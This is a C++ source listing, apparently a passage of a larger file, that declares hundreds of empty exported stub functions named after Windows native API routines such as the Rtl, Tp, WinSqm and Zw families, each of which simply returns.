extern "C" { __declspec(dllexport) void RtlSetGroupSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetHeapInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlSetInformationAcl() { return; } }
extern "C" { __declspec(dllexport) void RtlSetIoCompletionCallback() { return; } }
extern "C" { __declspec(dllexport) void RtlSetLastWin32Error() { return; } }
extern "C" { __declspec(dllexport) void RtlSetLastWin32ErrorAndNtStatusFromNtStatus() { return; } }
extern "C" { __declspec(dllexport) void RtlSetMemoryStreamSize() { return; } }
extern "C" { __declspec(dllexport) void RtlSetOwnerSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetPortableOperatingSystem() { return; } }
extern "C" { __declspec(dllexport) void RtlSetProcessDebugInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlSetProcessIsCritical() { return; } }
extern "C" { __declspec(dllexport) void RtlSetProcessPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlSetSaclSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetSearchPathMode() { return; } }
extern "C" { __declspec(dllexport) void RtlSetSecurityDescriptorRMControl() { return; } }
extern "C" { __declspec(dllexport) void RtlSetSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlSetSecurityObjectEx() { return; } }
extern "C" { __declspec(dllexport) void RtlSetThreadErrorMode() { return; } }
extern "C" { __declspec(dllexport) void RtlSetThreadIsCritical() { return; } }
extern "C" { __declspec(dllexport) void RtlSetThreadPoolStartFunc() { return; } }
extern "C" { __declspec(dllexport) void RtlSetThreadPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlSetTimeZoneInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlSetTimer() { return; } }
extern "C" { __declspec(dllexport) void RtlSetUmsThreadInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlSetUnhandledExceptionFilter() { return; } }
extern "C" { __declspec(dllexport) void RtlSetUserFlagsHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlSetUserValueHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlSidDominates() { return; } }
extern "C" { __declspec(dllexport) void RtlSidEqualLevel() { return; } }
extern "C" { __declspec(dllexport) void RtlSidHashInitialize() { return; } }
extern "C" { __declspec(dllexport) void RtlSidHashLookup() { return; } }
extern "C" { __declspec(dllexport) void RtlSidIsHigherLevel() { return; } }
extern "C" { __declspec(dllexport) void RtlSizeHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlSleepConditionVariableCS() { return; } }
extern "C" { __declspec(dllexport) void RtlSleepConditionVariableSRW() { return; } }
extern "C" { __declspec(dllexport) void RtlSplay() { return; } }
extern "C" { __declspec(dllexport) void RtlStartRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlStatMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlStringFromGUID() { return; } }
extern "C" { __declspec(dllexport) void RtlSubAuthorityCountSid() { return; } }
extern "C" { __declspec(dllexport) void RtlSubAuthoritySid() { return; } }
extern "C" { __declspec(dllexport) void RtlSubscribeWnfStateChangeNotification() { return; } }
extern "C" { __declspec(dllexport) void RtlSubtreePredecessor() { return; } }
extern "C" { __declspec(dllexport) void RtlSubtreeSuccessor() { return; } }
extern "C" { __declspec(dllexport) void RtlSystemTimeToLocalTime() { return; } }
extern "C" { __declspec(dllexport) void RtlTestAndPublishWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void RtlTestBit() { return; } }
extern "C" { __declspec(dllexport) void RtlTimeFieldsToTime() { return; } }
extern "C" { __declspec(dllexport) void RtlTimeToElapsedTimeFields() { return; } }
extern "C" { __declspec(dllexport) void RtlTimeToSecondsSince1970() { return; } }
extern "C" { __declspec(dllexport) void RtlTimeToSecondsSince1980() { return; } }
extern "C" { __declspec(dllexport) void RtlTimeToTimeFields() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseAdd() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseCreate() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseDestroy() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseEnumerate() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseFind() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseLock() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseUnlock() { return; } }
extern "C" { __declspec(dllexport) void RtlTraceDatabaseValidate() { return; } }
extern "C" { __declspec(dllexport) void RtlTryAcquirePebLock() { return; } }
extern "C" { __declspec(dllexport) void RtlTryAcquireSRWLockExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlTryAcquireSRWLockShared() { return; } }
extern "C" { __declspec(dllexport) void RtlTryConvertSRWLockSharedToExclusiveOrRelease() { return; } }
extern "C" { __declspec(dllexport) void RtlTryEnterCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlUTF8ToUnicodeN() { return; } }
extern "C" { __declspec(dllexport) void RtlUmsThreadYield() { return; } }
extern "C" { __declspec(dllexport) void RtlUnhandledExceptionFilter() { return; } }
extern "C" { __declspec(dllexport) void RtlUnhandledExceptionFilter2() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToAnsiSize() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToAnsiString() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToCountedOemString() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToInteger() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToOemSize() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeStringToOemString() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeToCustomCPN() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeToMultiByteN() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeToMultiByteSize() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeToOemN() { return; } }
extern "C" { __declspec(dllexport) void RtlUnicodeToUTF8N() { return; } }
extern "C" { __declspec(dllexport) void RtlUniform() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockBootStatusData() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockCurrentThread() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockMemoryStreamRegion() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlUnlockModuleSection() { return; } }
extern "C" { __declspec(dllexport) void RtlUnsubscribeWnfNotificationWaitForCompletion() { return; } }
extern "C" { __declspec(dllexport) void RtlUnsubscribeWnfNotificationWithCompletionCallback() { return; } }
extern "C" { __declspec(dllexport) void RtlUnsubscribeWnfStateChangeNotification() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeChar() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeStringToAnsiString() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeStringToCountedOemString() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeStringToOemString() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeToCustomCPN() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeToMultiByteN() { return; } }
extern "C" { __declspec(dllexport) void RtlUpcaseUnicodeToOemN() { return; } }
extern "C" { __declspec(dllexport) void RtlUpdateClonedCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlUpdateClonedSRWLock() { return; } }
extern "C" { __declspec(dllexport) void RtlUpdateTimer() { return; } }
extern "C" { __declspec(dllexport) void RtlUpperChar() { return; } }
extern "C" { __declspec(dllexport) void RtlUpperString() { return; } }
extern "C" { __declspec(dllexport) void RtlUserThreadStart() { return; } }
extern "C" { __declspec(dllexport) void RtlValidAcl() { return; } }
extern "C" { __declspec(dllexport) void RtlValidRelativeSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlValidSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlValidSid() { return; } }
extern "C" { __declspec(dllexport) void RtlValidateHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlValidateProcessHeaps() { return; } }
extern "C" { __declspec(dllexport) void RtlValidateUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlVerifyVersionInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlWaitForWnfMetaNotification() { return; } }
extern "C" { __declspec(dllexport) void RtlWaitOnAddress() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeAddressAll() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeAddressAllNoFence() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeAddressSingle() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeAddressSingleNoFence() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeAllConditionVariable() { return; } }
extern "C" { __declspec(dllexport) void RtlWakeConditionVariable() { return; } }
extern "C" { __declspec(dllexport) void RtlWalkFrameChain() { return; } }
extern "C" { __declspec(dllexport) void RtlWalkHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlWeaklyEnumerateEntryHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlWerpReportException() { return; } }
extern "C" { __declspec(dllexport) void RtlWnfCompareChangeStamp() { return; } }
extern "C" { __declspec(dllexport) void RtlWnfDllUnloadCallback() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64CallFunction64() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64EnableFsRedirection() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64EnableFsRedirectionEx() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64GetThreadContext() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64GetThreadSelectorEntry() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64LogMessageInEventLogger() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64SetThreadContext() { return; } }
extern "C" { __declspec(dllexport) void RtlWow64SuspendThread() { return; } }
extern "C" { __declspec(dllexport) void RtlWriteMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlWriteRegistryValue() { return; } }
extern "C" { __declspec(dllexport) void RtlZeroHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlZombifyActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlpApplyLengthFunction() { return; } }
extern "C" { __declspec(dllexport) void RtlpCheckDynamicTimeZoneInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlpCleanupRegistryKeys() { return; } }
extern "C" { __declspec(dllexport) void RtlpConvertAbsoluteToRelativeSecurityAttribute() { return; } }
extern "C" { __declspec(dllexport) void RtlpConvertCultureNamesToLCIDs() { return; } }
extern "C" { __declspec(dllexport) void RtlpConvertLCIDsToCultureNames() { return; } }
extern "C" { __declspec(dllexport) void RtlpConvertRelativeToAbsoluteSecurityAttribute() { return; } }
extern "C" { __declspec(dllexport) void RtlpCreateProcessRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpEnsureBufferSize() { return; } }
extern "C" { __declspec(dllexport) void RtlpExecuteUmsThread() { return; } }
extern "C" { __declspec(dllexport) void RtlpFreezeTimeBias() { return; } }
extern "C" { __declspec(dllexport) void RtlpGetLCIDFromLangInfoNode() { return; } }
extern "C" { __declspec(dllexport) void RtlpGetNameFromLangInfoNode() { return; } }
extern "C" { __declspec(dllexport) void RtlpGetSystemDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void RtlpGetUserOrMachineUILanguage4NLS() { return; } }
extern "C" { __declspec(dllexport) void RtlpInitializeLangRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpIsQualifiedLanguage() { return; } }
extern "C" { __declspec(dllexport) void RtlpLoadMachineUIByPolicy() { return; } }
extern "C" { __declspec(dllexport) void RtlpLoadUserUIByPolicy() { return; } }
extern "C" { __declspec(dllexport) void RtlpMergeSecurityAttributeInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlpMuiFreeLangRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpMuiRegCreateRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpMuiRegFreeRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpMuiRegLoadRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlpNotOwnerCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtCreateKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtEnumerateSubKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtMakeTemporaryKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtOpenKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtQueryValueKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpNtSetValueKey() { return; } }
extern "C" { __declspec(dllexport) void RtlpQueryDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void RtlpQueryProcessDebugInformationFromWow64() { return; } }
extern "C" { __declspec(dllexport) void RtlpRefreshCachedUILanguage() { return; } }
extern "C" { __declspec(dllexport) void RtlpSetInstallLanguage() { return; } }
extern "C" { __declspec(dllexport) void RtlpSetPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlpSetUserPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlpUmsExecuteYieldThreadEnd() { return; } }
extern "C" { __declspec(dllexport) void RtlpUmsThreadYield() { return; } }
extern "C" { __declspec(dllexport) void RtlpUnWaitCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlpVerifyAndCommitUILanguageSettings() { return; } }
extern "C" { __declspec(dllexport) void RtlpWaitForCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlpWnfNotificationThread() { return; } }
extern "C" { __declspec(dllexport) void RtlxAnsiStringToUnicodeSize() { return; } }
extern "C" { __declspec(dllexport) void RtlxOemStringToUnicodeSize() { return; } }
extern "C" { __declspec(dllexport) void RtlxUnicodeStringToAnsiSize() { return; } }
extern "C" { __declspec(dllexport) void RtlxUnicodeStringToOemSize() { return; } }
extern "C" { __declspec(dllexport) void SbExecuteProcedure() { return; } }
extern "C" { __declspec(dllexport) void SbSelectProcedure() { return; } }
extern "C" { __declspec(dllexport) void ShipAssert() { return; } }
extern "C" { __declspec(dllexport) void ShipAssertGetBufferInfo() { return; } }
extern "C" { __declspec(dllexport) void ShipAssertMsgA() { return; } }
extern "C" { __declspec(dllexport) void ShipAssertMsgW() { return; } }
extern "C" { __declspec(dllexport) void TpAllocAlpcCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpAllocAlpcCompletionEx() { return; } }
extern "C" { __declspec(dllexport) void TpAllocCleanupGroup() { return; } }
extern "C" { __declspec(dllexport) void TpAllocIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpAllocJobNotification() { return; } }
extern "C" { __declspec(dllexport) void TpAllocPool() { return; } }
extern "C" { __declspec(dllexport) void TpAllocTimer() { return; } }
extern "C" { __declspec(dllexport) void TpAllocWait() { return; } }
extern "C" { __declspec(dllexport) void TpAllocWork() { return; } }
extern "C" { __declspec(dllexport) void TpAlpcRegisterCompletionList() { return; } }
extern "C" { __declspec(dllexport) void TpAlpcUnregisterCompletionList() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackDetectedUnrecoverableError() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackIndependent() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackLeaveCriticalSectionOnCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackMayRunLong() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackReleaseMutexOnCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackReleaseSemaphoreOnCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackSetEventOnCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpCallbackUnloadDllOnCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpCancelAsyncIoOperation() { return; } }
extern "C" { __declspec(dllexport) void TpCaptureCaller() { return; } }
extern "C" { __declspec(dllexport) void TpCheckTerminateWorker() { return; } }
extern "C" { __declspec(dllexport) void TpDbgDumpHeapUsage() { return; } }
extern "C" { __declspec(dllexport) void TpDbgSetLogRoutine() { return; } }
extern "C" { __declspec(dllexport) void TpDisablePoolCallbackChecks() { return; } }
extern "C" { __declspec(dllexport) void TpDisassociateCallback() { return; } }
extern "C" { __declspec(dllexport) void TpIsTimerSet() { return; } }
extern "C" { __declspec(dllexport) void TpPostWork() { return; } }
extern "C" { __declspec(dllexport) void TpQueryPoolStackInformation() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseAlpcCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseCleanupGroup() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseCleanupGroupMembers() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseJobNotification() { return; } }
extern "C" { __declspec(dllexport) void TpReleasePool() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseTimer() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseWait() { return; } }
extern "C" { __declspec(dllexport) void TpReleaseWork() { return; } }
extern "C" { __declspec(dllexport) void TpSetDefaultPoolMaxThreads() { return; } }
extern "C" { __declspec(dllexport) void TpSetDefaultPoolStackInformation() { return; } }
extern "C" { __declspec(dllexport) void TpSetPoolMaxThreads() { return; } }
extern "C" { __declspec(dllexport) void TpSetPoolMinThreads() { return; } }
extern "C" { __declspec(dllexport) void TpSetPoolStackInformation() { return; } }
extern "C" { __declspec(dllexport) void TpSetPoolThreadBasePriority() { return; } }
extern "C" { __declspec(dllexport) void TpSetTimer() { return; } }
extern "C" { __declspec(dllexport) void TpSetTimerEx() { return; } }
extern "C" { __declspec(dllexport) void TpSetWait() { return; } }
extern "C" { __declspec(dllexport) void TpSetWaitEx() { return; } }
extern "C" { __declspec(dllexport) void TpSimpleTryPost() { return; } }
extern "C" { __declspec(dllexport) void TpStartAsyncIoOperation() { return; } }
extern "C" { __declspec(dllexport) void TpTimerOutstandingCallbackCount() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForAlpcCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForJobNotification() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForTimer() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForWait() { return; } }
extern "C" { __declspec(dllexport) void TpWaitForWork() { return; } }
extern "C" { __declspec(dllexport) void WerReportSQMEvent() { return; } }
extern "C" { __declspec(dllexport) void WinSqmAddToAverageDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmAddToStream() { return; } }
extern "C" { __declspec(dllexport) void WinSqmAddToStreamEx() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCheckEscalationAddToStreamEx() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCheckEscalationSetDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCheckEscalationSetDWORD64() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCheckEscalationSetString() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCommonDatapointDelete() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCommonDatapointSetDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCommonDatapointSetDWORD64() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCommonDatapointSetStreamEx() { return; } }
extern "C" { __declspec(dllexport) void WinSqmCommonDatapointSetString() { return; } }
extern "C" { __declspec(dllexport) void WinSqmEndSession() { return; } }
extern "C" { __declspec(dllexport) void WinSqmEventEnabled() { return; } }
extern "C" { __declspec(dllexport) void WinSqmEventWrite() { return; } }
extern "C" { __declspec(dllexport) void WinSqmGetEscalationRuleStatus() { return; } }
extern "C" { __declspec(dllexport) void WinSqmGetInstrumentationProperty() { return; } }
extern "C" { __declspec(dllexport) void WinSqmIncrementDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmIsOptedIn() { return; } }
extern "C" { __declspec(dllexport) void WinSqmIsOptedInEx() { return; } }
extern "C" { __declspec(dllexport) void WinSqmIsSessionDisabled() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetDWORD64() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetEscalationInfo() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetIfMaxDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetIfMinDWORD() { return; } }
extern "C" { __declspec(dllexport) void WinSqmSetString() { return; } }
extern "C" { __declspec(dllexport) void WinSqmStartSession() { return; } }
extern "C" { __declspec(dllexport) void ZwAcceptConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheck() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckByType() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckByTypeAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckByTypeResultList() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckByTypeResultListAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwAccessCheckByTypeResultListAndAuditAlarmByHandle() { return; } }
extern "C" { __declspec(dllexport) void ZwAddAtom() { return; } }
extern "C" { __declspec(dllexport) void ZwAddAtomEx() { return; } }
extern "C" { __declspec(dllexport) void ZwAddBootEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwAddDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwAdjustGroupsToken() { return; } }
extern "C" { __declspec(dllexport) void ZwAdjustPrivilegesToken() { return; } }
extern "C" { __declspec(dllexport) void ZwAdjustTokenClaimsAndDeviceGroups() { return; } }
extern "C" { __declspec(dllexport) void ZwAlertResumeThread() { return; } }
extern "C" { __declspec(dllexport) void ZwAlertThread() { return; } }
extern "C" { __declspec(dllexport) void ZwAlertThreadByThreadId() { return; } }
extern "C" { __declspec(dllexport) void ZwAllocateLocallyUniqueId() { return; } }
extern "C" { __declspec(dllexport) void ZwAllocateReserveObject() { return; } }
extern "C" { __declspec(dllexport) void ZwAllocateUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void ZwAllocateUuids() { return; } }
extern "C" { __declspec(dllexport) void ZwAllocateVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcAcceptConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCancelMessage() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcConnectPortEx() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCreatePort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCreatePortSection() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCreateResourceReserve() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCreateSectionView() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcCreateSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcDeletePortSection() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcDeleteResourceReserve() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcDeleteSectionView() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcDeleteSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcDisconnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcImpersonateClientOfPort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcOpenSenderProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcOpenSenderThread() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcQueryInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcQueryInformationMessage() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcRevokeSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcSendWaitReceivePort() { return; } }
extern "C" { __declspec(dllexport) void ZwAlpcSetInformation() { return; } }
extern "C" { __declspec(dllexport) void ZwApphelpCacheControl() { return; } }
extern "C" { __declspec(dllexport) void ZwAreMappedFilesTheSame() { return; } }
extern "C" { __declspec(dllexport) void ZwAssignProcessToJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwAssociateWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void ZwCallbackReturn() { return; } }
extern "C" { __declspec(dllexport) void ZwCancelIoFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCancelIoFileEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCancelSynchronousIoFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCancelTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwCancelWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void ZwClearEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwClose() { return; } }
extern "C" { __declspec(dllexport) void ZwCloseObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwCommitComplete() { return; } }
extern "C" { __declspec(dllexport) void ZwCommitEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwCommitTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwCompactKeys() { return; } }
extern "C" { __declspec(dllexport) void ZwCompareTokens() { return; } }
extern "C" { __declspec(dllexport) void ZwCompleteConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwCompressKey() { return; } }
extern "C" { __declspec(dllexport) void ZwConnectPort() { return; } }
extern "C" { __declspec(dllexport) void ZwContinue() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateDebugObject() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateDirectoryObjectEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateEnlistment() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateEventPair() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateIRTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateJobObject() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateJobSet() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateKey() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateKeyTransacted() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateLowBoxToken() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateMailslotFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateMutant() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateNamedPipeFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCreatePagingFile() { return; } }
extern "C" { __declspec(dllexport) void ZwCreatePort() { return; } }
extern "C" { __declspec(dllexport) void ZwCreatePrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateProcessEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateProfile() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateProfileEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateResourceManager() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateSection() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateSemaphore() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateSymbolicLinkObject() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateThread() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateThreadEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateTimer() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateToken() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateTokenEx() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateTransaction() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateUserProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateWaitablePort() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateWnfStateName() { return; } }
extern "C" { __declspec(dllexport) void ZwCreateWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void ZwDebugActiveProcess() { return; } }
extern "C" { __declspec(dllexport) void ZwDebugContinue() { return; } }
extern "C" { __declspec(dllexport) void ZwDelayExecution() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteAtom() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteBootEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteFile() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteKey() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void ZwDeletePrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteValueKey() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void ZwDeleteWnfStateName() { return; } }
